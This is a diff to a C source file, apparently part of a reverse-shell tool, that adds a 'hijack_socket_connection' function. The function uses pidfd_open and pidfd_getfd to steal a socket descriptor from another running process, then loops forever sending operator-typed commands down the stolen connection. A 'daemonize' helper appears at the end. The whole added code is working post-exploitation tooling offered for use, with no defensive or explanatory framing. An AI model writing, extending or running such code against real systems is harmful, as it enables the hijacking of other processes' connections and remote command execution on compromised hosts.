@@ -1,5 +1,64 @@
 #include "include/reverse_shell.h"
 
+
+
+
+int pidfd_open(pid_t pid, unsigned int flags) 
+{
+    return syscall(SYS_pidfd_open, pid, flags);
+}
+
+
+int pidfd_getfd(int pidfd, int targetfd, unsigned int flags) 
+{
+    return syscall(SYS_pidfd_getfd, pidfd, targetfd, flags);
+}
+
+
+
+
+bool hijack_socket_connection(pid_t target_pid,int target_fd)
+{
+	int pidfd = pidfd_open(target_pid,0);
+	if (pidfd < 0)
+	{
+		return_defer(pidfd_open_failed);
+	}
+
+	int sockfd = pidfd_getfd(pidfd,target_fd,0);
+	if (sockfd < 0)
+	{
+		return_defer(pidfd_getfd_failed);
+	}
+
+	int flags = fcntl(sockfd,F_GETFL,0);
+	fcntl(sockfd,F_SETFL,flags & ~O_NONBLOCK);
+
+	#define TRUE 1
+	while(TRUE)
+	{
+		char buf[4096] = {0};
+		printf(" Enter command #>> ");
+		fgets(buf,4096,stdin);
+		send(sockfd,buf,strlen(buf),0);
+		puts("");
+	}
+
+	close(sockfd);
+	close(pidfd);
+
+
+pidfd_getfd_failed:
+	PRINT_DEBUG("pidfd_getfd : ");
+	return_defer(failure);
+
+pidfd_open_failed:
+	PRINT_DEBUG("pidfd_open : ");
+
+failure:
+	return false;
+}
+
 bool daemonize(const char *dir_path)
 {
 
